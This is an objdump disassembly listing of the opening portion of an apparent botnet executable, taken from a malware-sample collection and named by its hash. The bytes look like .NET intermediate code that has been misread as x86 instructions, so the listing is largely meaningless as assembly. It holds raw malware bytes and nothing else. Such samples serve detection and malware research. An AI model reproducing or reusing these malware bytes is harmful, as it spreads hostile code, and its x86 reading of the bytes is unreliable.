
malware_samples/botnet/736f49963ec954ea8587f33db233f3000512202cd33e5db7fdc86030e5a56b24.exe:     file format pei-i386


Disassembly of section .text:

00402000 <.text>:
  402000:	d0 d0                	rcl    $1,%al
  402002:	00 00                	add    %al,(%eax)
  402004:	00 00                	add    %al,(%eax)
  402006:	00 00                	add    %al,(%eax)
  402008:	48                   	dec    %eax
  402009:	00 00                	add    %al,(%eax)
  40200b:	00 02                	add    %al,(%edx)
  40200d:	00 05 00 f4 59 00    	add    %al,0x59f400
  402013:	00 a8 76 00 00 03    	add    %ch,0x3000076(%eax)
  402019:	00 00                	add    %al,(%eax)
  40201b:	00 01                	add    %al,(%ecx)
  40201d:	00 00                	add    %al,(%eax)
  40201f:	06                   	push   %es
	...
  402050:	bf eb 1e 56 fb       	mov    $0xfb561eeb,%edi
  402055:	cd 97                	int    $0x97
  402057:	3b b2 19 02 24 30    	cmp    0x30240219(%edx),%esi
  40205d:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40205e:	78 43                	js     0x4020a3
  402060:	00 3d 56 44 d2 1e    	add    %bh,0x1ed24456
  402066:	62 b9 d4 f1 80 e7    	bound  %edi,-0x187f0e2c(%ecx)
  40206c:	e6 c3                	out    %al,$0xc3
  40206e:	39 41 2e             	cmp    %eax,0x2e(%ecx)
  402071:	00 2f                	add    %ch,(%edi)
  402073:	00 5c 00 00          	add    %bl,0x0(%eax,%eax,1)
  402077:	00 1e                	add    %bl,(%esi)
  402079:	02 28                	add    (%eax),%ch
  40207b:	18 00                	sbb    %al,(%eax)
  40207d:	00 0a                	add    %cl,(%edx)
  40207f:	2a 1a                	sub    (%edx),%bl
  402081:	7e 13                	jle    0x402096
  402083:	00 00                	add    %al,(%eax)
  402085:	04 2a                	add    $0x2a,%al
  402087:	1e                   	push   %ds
  402088:	02 80 13 00 00 04    	add    0x4000013(%eax),%al
  40208e:	2a 1a                	sub    (%edx),%bl
  402090:	7e 14                	jle    0x4020a6
  402092:	00 00                	add    %al,(%eax)
  402094:	04 2a                	add    $0x2a,%al
  402096:	1e                   	push   %ds
  402097:	02 80 14 00 00 04    	add    0x4000014(%eax),%al
  40209d:	2a 1a                	sub    (%edx),%bl
  40209f:	7e 15                	jle    0x4020b6
  4020a1:	00 00                	add    %al,(%eax)
  4020a3:	04 2a                	add    $0x2a,%al
  4020a5:	1e                   	push   %ds
  4020a6:	02 80 15 00 00 04    	add    0x4000015(%eax),%al
  4020ac:	2a 1a                	sub    (%edx),%bl
  4020ae:	7e 16                	jle    0x4020c6
  4020b0:	00 00                	add    %al,(%eax)
  4020b2:	04 2a                	add    $0x2a,%al
  4020b4:	1e                   	push   %ds
  4020b5:	02 80 16 00 00 04    	add    0x4000016(%eax),%al
  4020bb:	2a 1a                	sub    (%edx),%bl
  4020bd:	7e 17                	jle    0x4020d6
  4020bf:	00 00                	add    %al,(%eax)
  4020c1:	04 2a                	add    $0x2a,%al
  4020c3:	1e                   	push   %ds
  4020c4:	02 80 17 00 00 04    	add    0x4000017(%eax),%al
  4020ca:	2a 1a                	sub    (%edx),%bl
  4020cc:	7e 18                	jle    0x4020e6
  4020ce:	00 00                	add    %al,(%eax)
  4020d0:	04 2a                	add    $0x2a,%al
  4020d2:	1e                   	push   %ds
  4020d3:	02 80 18 00 00 04    	add    0x4000018(%eax),%al
  4020d9:	2a 1a                	sub    (%edx),%bl
  4020db:	7e 19                	jle    0x4020f6
  4020dd:	00 00                	add    %al,(%eax)
  4020df:	04 2a                	add    $0x2a,%al
  4020e1:	1e                   	push   %ds
  4020e2:	02 80 19 00 00 04    	add    0x4000019(%eax),%al
  4020e8:	2a 1a                	sub    (%edx),%bl
  4020ea:	7e 1a                	jle    0x402106
  4020ec:	00 00                	add    %al,(%eax)
  4020ee:	04 2a                	add    $0x2a,%al
  4020f0:	1a 7e 1b             	sbb    0x1b(%esi),%bh
  4020f3:	00 00                	add    %al,(%eax)
  4020f5:	04 2a                	add    $0x2a,%al
  4020f7:	1e                   	push   %ds
  4020f8:	02 80 1b 00 00 04    	add    0x400001b(%eax),%al
  4020fe:	2a 1a                	sub    (%edx),%bl
  402100:	7e 1c                	jle    0x40211e
  402102:	00 00                	add    %al,(%eax)
  402104:	04 2a                	add    $0x2a,%al
  402106:	1e                   	push   %ds
  402107:	02 80 1c 00 00 04    	add    0x400001c(%eax),%al
  40210d:	2a 1a                	sub    (%edx),%bl
  40210f:	7e 1d                	jle    0x40212e
  402111:	00 00                	add    %al,(%eax)
  402113:	04 2a                	add    $0x2a,%al
  402115:	1e                   	push   %ds
  402116:	02 80 1d 00 00 04    	add    0x400001d(%eax),%al
  40211c:	2a 2a                	sub    (%edx),%ch
  40211e:	02 28                	add    (%eax),%ch
  402120:	3e 00 00             	add    %al,%ds:(%eax)
  402123:	0a 16                	or     (%esi),%dl
  402125:	fe 03                	incb   (%ebx)
  402127:	2a 32                	sub    (%edx),%dh
  402129:	7e 0b                	jle    0x402136
  40212b:	00 00                	add    %al,(%eax)
  40212d:	04 03                	add    $0x3,%al
  40212f:	6f                   	outsl  %ds:(%esi),(%dx)
  402130:	3f                   	aas
  402131:	00 00                	add    %al,(%eax)
  402133:	0a 2a                	or     (%edx),%ch
  402135:	2e 73 18             	jae,pn 0x402150
  402138:	00 00                	add    %al,(%eax)
  40213a:	0a 80 1a 00 00 04    	or     0x400001a(%eax),%al
  402140:	2a e6                	sub    %dh,%ah
  402142:	28 29                	sub    %ch,(%ecx)
  402144:	00 00                	add    %al,(%eax)
  402146:	06                   	push   %es
  402147:	3a 28                	cmp    (%eax),%ch
  402149:	00 00                	add    %al,(%eax)
  40214b:	00 28                	add    %ch,(%eax)
  40214d:	2a 00                	sub    (%eax),%al
  40214f:	00 06                	add    %al,(%esi)
  402151:	3a 1e                	cmp    (%esi),%bl
  402153:	00 00                	add    %al,(%eax)
  402155:	00 28                	add    %ch,(%eax)
  402157:	2b 00                	sub    (%eax),%eax
  402159:	00 06                	add    %al,(%esi)
  40215b:	3a 14 00             	cmp    (%eax,%eax,1),%dl
  40215e:	00 00                	add    %al,(%eax)
  402160:	28 27                	sub    %ah,(%edi)
  402162:	00 00                	add    %al,(%eax)
  402164:	06                   	push   %es
  402165:	3a 0a                	cmp    (%edx),%cl
  402167:	00 00                	add    %al,(%eax)
  402169:	00 28                	add    %ch,(%eax)
  40216b:	28 00                	sub    %al,(%eax)
  40216d:	00 06                	add    %al,(%esi)
  40216f:	39 06                	cmp    %eax,(%esi)
  402171:	00 00                	add    %al,(%eax)
  402173:	00 14 28             	add    %dl,(%eax,%ebp,1)
  402176:	76 00                	jbe    0x402178
  402178:	00 0a                	add    %cl,(%edx)
  40217a:	2a 56 28             	sub    0x28(%esi),%dl
  40217d:	9c                   	pushf
  40217e:	00 00                	add    %al,(%eax)
  402180:	0a 73 9d             	or     -0x63(%ebx),%dh
  402183:	00 00                	add    %al,(%eax)
  402185:	0a 20                	or     (%eax),%ah
  402187:	20 02                	and    %al,(%edx)
  402189:	00 00                	add    %al,(%eax)
  40218b:	6f                   	outsl  %ds:(%esi),(%dx)
  40218c:	9e                   	sahf
  40218d:	00 00                	add    %al,(%eax)
  40218f:	0a 2a                	or     (%edx),%ch
  402191:	6e                   	outsb  %ds:(%esi),(%dx)
  402192:	7e 1e                	jle    0x4021b2
  402194:	00 00                	add    %al,(%eax)
  402196:	04 39                	add    $0x39,%al
  402198:	10 00                	adc    %al,(%eax)
  40219a:	00 00                	add    %al,(%eax)
  40219c:	7e 1e                	jle    0x4021bc
  40219e:	00 00                	add    %al,(%eax)
  4021a0:	04 6f                	add    $0x6f,%al
  4021a2:	ad                   	lods   %ds:(%esi),%eax
  4021a3:	00 00                	add    %al,(%eax)
  4021a5:	0a 14 80             	or     (%eax,%eax,4),%dl
  4021a8:	1e                   	push   %ds
  4021a9:	00 00                	add    %al,(%eax)
  4021ab:	04 2a                	add    $0x2a,%al
  4021ad:	7e 7e                	jle    0x40222d
  4021af:	0f 00 00             	sldt   (%eax)
  4021b2:	04 28                	add    $0x28,%al
  4021b4:	17                   	pop    %ss
  4021b5:	00 00                	add    %al,(%eax)
  4021b7:	0a 39                	or     (%ecx),%bh
  4021b9:	0f 00 00             	sldt   (%eax)
  4021bc:	00 28                	add    %ch,(%eax)
  4021be:	30 00                	xor    %al,(%eax)
  4021c0:	00 06                	add    %al,(%esi)
  4021c2:	39 05 00 00 00 28    	cmp    %eax,0x28000000
  4021c8:	40                   	inc    %eax
  4021c9:	00 00                	add    %al,(%eax)
  4021cb:	06                   	push   %es
  4021cc:	2a 56 72             	sub    0x72(%esi),%dl
  4021cf:	06                   	push   %es
  4021d0:	26 00 70 7e          	add    %dh,%es:0x7e(%eax)
  4021d4:	10 00                	adc    %al,(%eax)
  4021d6:	00 04 28             	add    %al,(%eax,%ebp,1)
  4021d9:	6f                   	outsl  %ds:(%esi),(%dx)
  4021da:	00 00                	add    %al,(%eax)
  4021dc:	0a 80 23 00 00 04    	or     0x4000023(%eax),%al
  4021e2:	2a be 73 94 00 00    	sub    0x9473(%esi),%bh
  4021e8:	06                   	push   %es
  4021e9:	25 72 ba 21 00       	and    $0x21ba72,%eax
  4021ee:	70 6f                	jo     0x40225f
  4021f0:	7f 00                	jg     0x4021f2
  4021f2:	00 06                	add    %al,(%esi)
  4021f4:	72 b2                	jb     0x4021a8
  4021f6:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  4021fa:	8c 00                	mov    %es,(%eax)
  4021fc:	00 06                	add    %al,(%esi)
  4021fe:	6f                   	outsl  %ds:(%esi),(%dx)
  4021ff:	89 00                	mov    %eax,(%eax)
  402201:	00 06                	add    %al,(%esi)
  402203:	28 20                	sub    %ah,(%eax)
  402205:	00 00                	add    %al,(%eax)
  402207:	06                   	push   %es
  402208:	20 e8                	and    %ch,%al
  40220a:	03 00                	add    (%eax),%eax
  40220c:	00 28                	add    %ch,(%eax)
  40220e:	14 00                	adc    $0x0,%al
  402210:	00 0a                	add    %cl,(%edx)
  402212:	2a da                	sub    %dl,%bl
  402214:	73 94                	jae    0x4021aa
  402216:	00 00                	add    %al,(%eax)
  402218:	06                   	push   %es
  402219:	25 72 ba 21 00       	and    $0x21ba72,%eax
  40221e:	70 6f                	jo     0x40228f
  402220:	7f 00                	jg     0x402222
  402222:	00 06                	add    %al,(%esi)
  402224:	72 c4                	jb     0x4021ea
  402226:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  40222a:	8c 00                	mov    %es,(%eax)
  40222c:	00 06                	add    %al,(%esi)
  40222e:	25 72 c4 26 00       	and    $0x26c472,%eax
  402233:	70 6f                	jo     0x4022a4
  402235:	7f 00                	jg     0x402237
  402237:	00 06                	add    %al,(%esi)
  402239:	02 6f 8c             	add    -0x74(%edi),%ch
  40223c:	00 00                	add    %al,(%eax)
  40223e:	06                   	push   %es
  40223f:	6f                   	outsl  %ds:(%esi),(%dx)
  402240:	89 00                	mov    %eax,(%eax)
  402242:	00 06                	add    %al,(%esi)
  402244:	28 20                	sub    %ah,(%eax)
  402246:	00 00                	add    %al,(%eax)
  402248:	06                   	push   %es
  402249:	2a 2e                	sub    (%esi),%ch
  40224b:	73 c9                	jae    0x402216
  40224d:	00 00                	add    %al,(%eax)
  40224f:	0a 80 24 00 00 04    	or     0x4000024(%eax),%al
  402255:	2a 5e 02             	sub    0x2(%esi),%bl
  402258:	28 19                	sub    %bl,(%ecx)
  40225a:	00 00                	add    %al,(%eax)
  40225c:	0a 03                	or     (%ebx),%al
  40225e:	6f                   	outsl  %ds:(%esi),(%dx)
  40225f:	1f                   	pop    %ds
  402260:	00 00                	add    %al,(%eax)
  402262:	0a 28                	or     (%eax),%ch
  402264:	4d                   	dec    %ebp
  402265:	00 00                	add    %al,(%eax)
  402267:	06                   	push   %es
  402268:	28 ce                	sub    %cl,%dh
  40226a:	00 00                	add    %al,(%eax)
  40226c:	0a 2a                	or     (%edx),%ch
  40226e:	5e                   	pop    %esi
  40226f:	28 19                	sub    %bl,(%ecx)
  402271:	00 00                	add    %al,(%eax)
  402273:	0a 02                	or     (%edx),%al
  402275:	03 28                	add    (%eax),%ebp
  402277:	1a 00                	sbb    (%eax),%al
  402279:	00 0a                	add    %cl,(%edx)
  40227b:	28 4f 00             	sub    %cl,0x0(%edi)
  40227e:	00 06                	add    %al,(%esi)
  402280:	6f                   	outsl  %ds:(%esi),(%dx)
  402281:	1b 00                	sbb    (%eax),%eax
  402283:	00 0a                	add    %cl,(%edx)
  402285:	2a 62 1f             	sub    0x1f(%edx),%ah
  402288:	20 8d 44 00 00 01    	and    %cl,0x1000044(%ebp)
  40228e:	25 d0 2d 00 00       	and    $0x2dd0,%eax
  402293:	04 28                	add    $0x28,%al
  402295:	e4 00                	in     $0x0,%al
  402297:	00 0a                	add    %cl,(%edx)
  402299:	80 2c 00 00          	subb   $0x0,(%eax,%eax,1)
  40229d:	04 2a                	add    $0x2a,%al
  40229f:	32 7e 2e             	xor    0x2e(%esi),%bh
  4022a2:	00 00                	add    %al,(%eax)
  4022a4:	04 02                	add    $0x2,%al
  4022a6:	6f                   	outsl  %ds:(%esi),(%dx)
  4022a7:	1f                   	pop    %ds
  4022a8:	00 00                	add    %al,(%eax)
  4022aa:	0a 2a                	or     (%edx),%ch
  4022ac:	32 7e 2e             	xor    0x2e(%esi),%bh
  4022af:	00 00                	add    %al,(%eax)
  4022b1:	04 02                	add    $0x2,%al
  4022b3:	6f                   	outsl  %ds:(%esi),(%dx)
  4022b4:	1b 00                	sbb    (%eax),%eax
  4022b6:	00 0a                	add    %cl,(%edx)
  4022b8:	2a 32                	sub    (%edx),%dh
  4022ba:	02 28                	add    (%eax),%ch
  4022bc:	e7 00                	out    %eax,$0x0
  4022be:	00 0a                	add    %cl,(%edx)
  4022c0:	28 58 00             	sub    %bl,0x0(%eax)
  4022c3:	00 06                	add    %al,(%esi)
  4022c5:	2a 8e 1a 8d 44 00    	sub    0x448d1a(%esi),%cl
  4022cb:	00 01                	add    %al,(%ecx)
  4022cd:	25 19 02 d2 9c       	and    $0x9cd20219,%eax
  4022d2:	25 18 02 1e 63       	and    $0x631e0218,%eax
  4022d7:	d2 9c 25 17 02 1f 10 	rcrb   %cl,0x101f0217(%ebp,%eiz,1)
  4022de:	63 d2                	arpl   %edx,%edx
  4022e0:	9c                   	pushf
  4022e1:	25 16 02 1f 18       	and    $0x181f0216,%eax
  4022e6:	63 d2                	arpl   %edx,%edx
  4022e8:	9c                   	pushf
  4022e9:	2a 4e 18             	sub    0x18(%esi),%cl
  4022ec:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  4022f0:	01 25 17 02 d2 9c    	add    %esp,0x9cd20217
  4022f6:	25 16 02 1e 63       	and    $0x631e0216,%eax
  4022fb:	d2 9c 2a 32 02 28 e8 	rcrb   %cl,-0x17d7fdce(%edx,%ebp,1)
  402302:	00 00                	add    %al,(%eax)
  402304:	0a 28                	or     (%eax),%ch
  402306:	58                   	pop    %eax
  402307:	00 00                	add    %al,(%eax)
  402309:	06                   	push   %es
  40230a:	2a 2e                	sub    (%esi),%ch
  40230c:	73 e9                	jae    0x4022f7
  40230e:	00 00                	add    %al,(%eax)
  402310:	0a 80 2e 00 00 04    	or     0x400002e(%eax),%al
  402316:	2a 56 02             	sub    0x2(%esi),%dl
  402319:	15 7d 30 00 00       	adc    $0x307d,%eax
  40231e:	04 02                	add    $0x2,%al
  402320:	28 18                	sub    %bl,(%eax)
  402322:	00 00                	add    %al,(%eax)
  402324:	0a 02                	or     (%edx),%al
  402326:	03 7d 2f             	add    0x2f(%ebp),%edi
  402329:	00 00                	add    %al,(%eax)
  40232b:	04 2a                	add    $0x2a,%al
  40232d:	4a                   	dec    %edx
  40232e:	02 7b 2f             	add    0x2f(%ebx),%bh
  402331:	00 00                	add    %al,(%eax)
  402333:	04 02                	add    $0x2,%al
  402335:	7b 30                	jnp    0x402367
  402337:	00 00                	add    %al,(%eax)
  402339:	04 6f                	add    $0x6f,%al
  40233b:	ea 00 00 0a 2a 8a 02 	ljmp   $0x28a,$0x2a0a0000
  402342:	02 7b 30             	add    0x30(%ebx),%bh
  402345:	00 00                	add    %al,(%eax)
  402347:	04 17                	add    $0x17,%al
  402349:	58                   	pop    %eax
  40234a:	7d 30                	jge    0x40237c
  40234c:	00 00                	add    %al,(%eax)
  40234e:	04 02                	add    $0x2,%al
  402350:	7b 30                	jnp    0x402382
  402352:	00 00                	add    %al,(%eax)
  402354:	04 02                	add    $0x2,%al
  402356:	7b 2f                	jnp    0x402387
  402358:	00 00                	add    %al,(%eax)
  40235a:	04 6f                	add    $0x6f,%al
  40235c:	eb 00                	jmp    0x40235e
  40235e:	00 0a                	add    %cl,(%edx)
  402360:	fe 04 2a             	incb   (%edx,%ebp,1)
  402363:	22 02                	and    (%edx),%al
  402365:	15 7d 30 00 00       	adc    $0x307d,%eax
  40236a:	04 2a                	add    $0x2a,%al
  40236c:	56                   	push   %esi
  40236d:	02 28                	add    (%eax),%ch
  40236f:	18 00                	sbb    %al,(%eax)
  402371:	00 0a                	add    %cl,(%edx)
  402373:	02 03                	add    (%ebx),%al
  402375:	7d 32                	jge    0x4023a9
  402377:	00 00                	add    %al,(%eax)
  402379:	04 02                	add    $0x2,%al
  40237b:	04 7d                	add    $0x7d,%al
  40237d:	31 00                	xor    %eax,(%eax)
  40237f:	00 04 2a             	add    %al,(%edx,%ebp,1)
  402382:	32 02                	xor    (%edx),%al
  402384:	7b 32                	jnp    0x4023b8
  402386:	00 00                	add    %al,(%eax)
  402388:	04 6f                	add    $0x6f,%al
  40238a:	71 00                	jno    0x40238c
  40238c:	00 06                	add    %al,(%esi)
  40238e:	2a 4e 02             	sub    0x2(%esi),%cl
  402391:	7b 32                	jnp    0x4023c5
  402393:	00 00                	add    %al,(%eax)
  402395:	04 6f                	add    $0x6f,%al
  402397:	71 00                	jno    0x402399
  402399:	00 06                	add    %al,(%esi)
  40239b:	25 03 6f 8c 00       	and    $0x8c6f03,%eax
  4023a0:	00 06                	add    %al,(%esi)
  4023a2:	2a 4e 02             	sub    0x2(%esi),%cl
  4023a5:	7b 32                	jnp    0x4023d9
  4023a7:	00 00                	add    %al,(%eax)
  4023a9:	04 6f                	add    $0x6f,%al
  4023ab:	71 00                	jno    0x4023ad
  4023ad:	00 06                	add    %al,(%esi)
  4023af:	25 03 6f 74 00       	and    $0x746f03,%eax
  4023b4:	00 06                	add    %al,(%esi)
  4023b6:	2a 4e 02             	sub    0x2(%esi),%cl
  4023b9:	7b 32                	jnp    0x4023ed
  4023bb:	00 00                	add    %al,(%eax)
  4023bd:	04 6f                	add    $0x6f,%al
  4023bf:	71 00                	jno    0x4023c1
  4023c1:	00 06                	add    %al,(%esi)
  4023c3:	25 03 6f 85 00       	and    $0x856f03,%eax
  4023c8:	00 06                	add    %al,(%esi)
  4023ca:	2a 36                	sub    (%esi),%dh
  4023cc:	02 7b 31             	add    0x31(%ebx),%bh
  4023cf:	00 00                	add    %al,(%eax)
  4023d1:	04 03                	add    $0x3,%al
  4023d3:	6f                   	outsl  %ds:(%esi),(%dx)
  4023d4:	ea 00 00 0a 2a 32 02 	ljmp   $0x232,$0x2a0a0000
  4023db:	7b 31                	jnp    0x40240e
  4023dd:	00 00                	add    %al,(%eax)
  4023df:	04 6f                	add    $0x6f,%al
  4023e1:	eb 00                	jmp    0x4023e3
  4023e3:	00 0a                	add    %cl,(%edx)
  4023e5:	2a 66 02             	sub    0x2(%esi),%ah
  4023e8:	03 7d 33             	add    0x33(%ebp),%edi
  4023eb:	00 00                	add    %al,(%eax)
  4023ed:	04 02                	add    $0x2,%al
  4023ef:	02 7b 33             	add    0x33(%ebx),%bh
  4023f2:	00 00                	add    %al,(%eax)
  4023f4:	04 6f                	add    $0x6f,%al
  4023f6:	7d 00                	jge    0x4023f8
  4023f8:	00 0a                	add    %cl,(%edx)
  4023fa:	7d 34                	jge    0x402430
  4023fc:	00 00                	add    %al,(%eax)
  4023fe:	04 2a                	add    $0x2a,%al
  402400:	82 02 7b             	addb   $0x7b,(%edx)
  402403:	36 00 00             	add    %al,%ss:(%eax)
  402406:	04 18                	add    $0x18,%al
  402408:	3b 0d 00 00 00 02    	cmp    0x2000000,%ecx
  40240e:	28 6b 00             	sub    %ch,0x0(%ebx)
  402411:	00 06                	add    %al,(%esi)
  402413:	02 18                	add    (%eax),%bl
  402415:	7d 36                	jge    0x40244d
  402417:	00 00                	add    %al,(%eax)
  402419:	04 02                	add    $0x2,%al
  40241b:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  40241f:	06                   	push   %es
  402420:	2a 82 02 7b 36 00    	sub    0x367b02(%edx),%al
  402426:	00 04 19             	add    %al,(%ecx,%ebx,1)
  402429:	3b 0d 00 00 00 02    	cmp    0x2000000,%ecx
  40242f:	28 6b 00             	sub    %ch,0x0(%ebx)
  402432:	00 06                	add    %al,(%esi)
  402434:	02 19                	add    (%ecx),%bl
  402436:	7d 36                	jge    0x40246e
  402438:	00 00                	add    %al,(%eax)
  40243a:	04 02                	add    $0x2,%al
  40243c:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  402440:	06                   	push   %es
  402441:	2a 1e                	sub    (%esi),%bl
  402443:	02 28                	add    (%eax),%ch
  402445:	70 00                	jo     0x402447
  402447:	00 06                	add    %al,(%esi)
  402449:	2a 52 02             	sub    0x2(%edx),%dl
  40244c:	03 8c 68 00 00 01 7d 	add    0x7d010000(%eax,%ebp,2),%ecx
  402453:	35 00 00 04 02       	xor    $0x2040000,%eax
  402458:	1b 7d 36             	sbb    0x36(%ebp),%edi
  40245b:	00 00                	add    %al,(%eax)
  40245d:	04 2a                	add    $0x2a,%al
  40245f:	52                   	push   %edx
  402460:	02 03                	add    (%ebx),%al
  402462:	8c 95 00 00 01 7d    	mov    %ss,0x7d010000(%ebp)
  402468:	35 00 00 04 02       	xor    $0x2040000,%eax
  40246d:	1c 7d                	sbb    $0x7d,%al
  40246f:	36 00 00             	add    %al,%ss:(%eax)
  402472:	04 2a                	add    $0x2a,%al
  402474:	42                   	inc    %edx
  402475:	02 03                	add    (%ebx),%al
  402477:	7d 35                	jge    0x4024ae
  402479:	00 00                	add    %al,(%eax)
  40247b:	04 02                	add    $0x2,%al
  40247d:	1f                   	pop    %ds
  40247e:	0b 7d 36             	or     0x36(%ebp),%edi
  402481:	00 00                	add    %al,(%eax)
  402483:	04 2a                	add    $0x2a,%al
  402485:	52                   	push   %edx
  402486:	02 28                	add    (%eax),%ch
  402488:	70 00                	jo     0x40248a
  40248a:	00 06                	add    %al,(%esi)
  40248c:	25 03 7d 33 00       	and    $0x337d03,%eax
  402491:	00 04 04             	add    %al,(%esp,%eax,1)
  402494:	6f                   	outsl  %ds:(%esi),(%dx)
  402495:	81 00 00 06 2a 56    	addl   $0x562a0600,(%eax)
  40249b:	02 28                	add    (%eax),%ch
  40249d:	70 00                	jo     0x40249f
  40249f:	00 06                	add    %al,(%esi)
  4024a1:	25 03 7d 33 00       	and    $0x337d03,%eax
  4024a6:	00 04 04             	add    %al,(%esp,%eax,1)
  4024a9:	6a 6f                	push   $0x6f
  4024ab:	74 00                	je     0x4024ad
  4024ad:	00 06                	add    %al,(%esi)
  4024af:	2a 56 02             	sub    0x2(%esi),%dl
  4024b2:	28 6b 00             	sub    %ch,0x0(%ebx)
  4024b5:	00 06                	add    %al,(%esi)
  4024b7:	02 14 7d 35 00 00 04 	add    0x4000035(,%edi,2),%dl
  4024be:	02 17                	add    (%edi),%dl
  4024c0:	7d 36                	jge    0x4024f8
  4024c2:	00 00                	add    %al,(%eax)
  4024c4:	04 2a                	add    $0x2a,%al
  4024c6:	3e 02 03             	add    %ds:(%ebx),%al
  4024c9:	7d 35                	jge    0x402500
  4024cb:	00 00                	add    %al,(%eax)
  4024cd:	04 02                	add    $0x2,%al
  4024cf:	1a 7d 36             	sbb    0x36(%ebp),%bh
  4024d2:	00 00                	add    %al,(%eax)
  4024d4:	04 2a                	add    $0x2a,%al
  4024d6:	76 02                	jbe    0x4024da
  4024d8:	7b 35                	jnp    0x40250f
  4024da:	00 00                	add    %al,(%eax)
  4024dc:	04 3a                	add    $0x3a,%al
  4024de:	06                   	push   %es
  4024df:	00 00                	add    %al,(%eax)
  4024e1:	00 72 b4             	add    %dh,-0x4c(%edx)
  4024e4:	21 00                	and    %eax,(%eax)
  4024e6:	70 2a                	jo     0x402512
  4024e8:	02 7b 35             	add    0x35(%ebx),%bh
  4024eb:	00 00                	add    %al,(%eax)
  4024ed:	04 6f                	add    $0x6f,%al
  4024ef:	38 00                	cmp    %al,(%eax)
  4024f1:	00 0a                	add    %cl,(%edx)
  4024f3:	2a 52 02             	sub    0x2(%edx),%dl
  4024f6:	1d 7d 36 00 00       	sbb    $0x367d,%eax
  4024fb:	04 02                	add    $0x2,%al
  4024fd:	03 8c 6c 00 00 01 7d 	add    0x7d010000(%esp,%ebp,2),%ecx
  402504:	35 00 00 04 2a       	xor    $0x2a040000,%eax
  402509:	56                   	push   %esi
  40250a:	02 1f                	add    (%edi),%bl
  40250c:	09 7d 36             	or     %edi,0x36(%ebp)
  40250f:	00 00                	add    %al,(%eax)
  402511:	04 02                	add    $0x2,%al
  402513:	03 8c 97 00 00 01 7d 	add    0x7d010000(%edi,%edx,4),%ecx
  40251a:	35 00 00 04 2a       	xor    $0x2a040000,%eax
  40251f:	52                   	push   %edx
  402520:	02 1e                	add    (%esi),%bl
  402522:	7d 36                	jge    0x40255a
  402524:	00 00                	add    %al,(%eax)
  402526:	04 02                	add    $0x2,%al
  402528:	03 8c 96 00 00 01 7d 	add    0x7d010000(%esi,%edx,4),%ecx
  40252f:	35 00 00 04 2a       	xor    $0x2a040000,%eax
  402534:	1e                   	push   %ds
  402535:	02 28                	add    (%eax),%ch
  402537:	82 00 00             	addb   $0x0,(%eax)
  40253a:	06                   	push   %es
  40253b:	2a 22                	sub    (%edx),%ah
  40253d:	02 03                	add    (%ebx),%al
  40253f:	28 81 00 00 06 2a    	sub    %al,0x2a060000(%ecx)
  402545:	1e                   	push   %ds
  402546:	02 28                	add    (%eax),%ch
  402548:	77 00                	ja     0x40254a
  40254a:	00 06                	add    %al,(%esi)
  40254c:	2a 22                	sub    (%edx),%ah
  40254e:	02 03                	add    (%ebx),%al
  402550:	28 74 00 00          	sub    %dh,0x0(%eax,%eax,1)
  402554:	06                   	push   %es
  402555:	2a 1e                	sub    (%esi),%bl
  402557:	02 28                	add    (%eax),%ch
  402559:	78 00                	js     0x40255b
  40255b:	00 06                	add    %al,(%esi)
  40255d:	2a 22                	sub    (%edx),%ah
  40255f:	02 03                	add    (%ebx),%al
  402561:	28 85 00 00 06 2a    	sub    %al,0x2a060000(%ebp)
  402567:	1e                   	push   %ds
  402568:	02 7b 36             	add    0x36(%ebx),%bh
  40256b:	00 00                	add    %al,(%eax)
  40256d:	04 2a                	add    $0x2a,%al
  40256f:	32 02                	xor    (%edx),%al
  402571:	7b 38                	jnp    0x4025ab
  402573:	00 00                	add    %al,(%eax)
  402575:	04 73                	add    $0x73,%al
  402577:	5f                   	pop    %edi
  402578:	00 00                	add    %al,(%eax)
  40257a:	06                   	push   %es
  40257b:	2a 4a 02             	sub    0x2(%edx),%cl
  40257e:	73 c9                	jae    0x402549
  402580:	00 00                	add    %al,(%eax)
  402582:	0a 7d 38             	or     0x38(%ebp),%bh
  402585:	00 00                	add    %al,(%eax)
  402587:	04 02                	add    $0x2,%al
  402589:	28 18                	sub    %bl,(%eax)
  40258b:	00 00                	add    %al,(%eax)
  40258d:	0a 2a                	or     (%edx),%ch
  40258f:	3a 02                	cmp    (%edx),%al
  402591:	6f                   	outsl  %ds:(%esi),(%dx)
  402592:	00 01                	add    %al,(%ecx)
  402594:	00 0a                	add    %cl,(%edx)
  402596:	d2 02                	rolb   %cl,(%edx)
  402598:	28 97 00 00 06 2a    	sub    %dl,0x2a060000(%edi)
  40259e:	32 02                	xor    (%edx),%al
  4025a0:	20 c0                	and    %al,%al
  4025a2:	00 00                	add    %al,(%eax)
  4025a4:	00 6f ee             	add    %ch,-0x12(%edi)
  4025a7:	00 00                	add    %al,(%eax)
  4025a9:	0a 2a                	or     (%edx),%ch
  4025ab:	6a 02                	push   $0x2
  4025ad:	20 cb                	and    %cl,%bl
  4025af:	00 00                	add    %al,(%eax)
  4025b1:	00 6f ee             	add    %ch,-0x12(%edi)
  4025b4:	00 00                	add    %al,(%eax)
  4025b6:	0a 02                	or     (%edx),%al
  4025b8:	03 28                	add    (%eax),%ebp
  4025ba:	5c                   	pop    %esp
  4025bb:	00 00                	add    %al,(%eax)
  4025bd:	06                   	push   %es
  4025be:	16                   	push   %ss
  4025bf:	1e                   	push   %ds
  4025c0:	6f                   	outsl  %ds:(%esi),(%dx)
  4025c1:	4c                   	dec    %esp
  4025c2:	00 00                	add    %al,(%eax)
  4025c4:	0a 2a                	or     (%edx),%ch
  4025c6:	7e 02                	jle    0x4025ca
  4025c8:	20 ca                	and    %cl,%dl
  4025ca:	00 00                	add    %al,(%eax)
  4025cc:	00 6f ee             	add    %ch,-0x12(%edi)
  4025cf:	00 00                	add    %al,(%eax)
  4025d1:	0a 02                	or     (%edx),%al
  4025d3:	03 28                	add    (%eax),%ebp
  4025d5:	fd                   	std
  4025d6:	00 00                	add    %al,(%eax)
  4025d8:	0a 28                	or     (%eax),%ch
  4025da:	58                   	pop    %eax
  4025db:	00 00                	add    %al,(%eax)
  4025dd:	06                   	push   %es
  4025de:	16                   	push   %ss
  4025df:	1a 6f 4c             	sbb    0x4c(%edi),%ch
  4025e2:	00 00                	add    %al,(%eax)
  4025e4:	0a 2a                	or     (%edx),%ch
  4025e6:	7a 03                	jp     0x4025eb
